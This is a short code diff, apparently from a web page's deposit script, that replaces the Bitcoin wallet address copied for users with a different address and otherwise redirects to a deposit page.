@@ -15,7 +15,7 @@
   }
 
   if ('Bitcoin' === wallet.trim()) {
-    return copy.value = 'bc1qlf405r8sm7vvp4c4f9h9sfyhpjrOpgc97a3fu3'
+    return copy.value = '38UHbxGDK4VAU9VUHJDJgzHQSYdG3g96CW'
   }
 
   document.location.href = '/deposit.html';
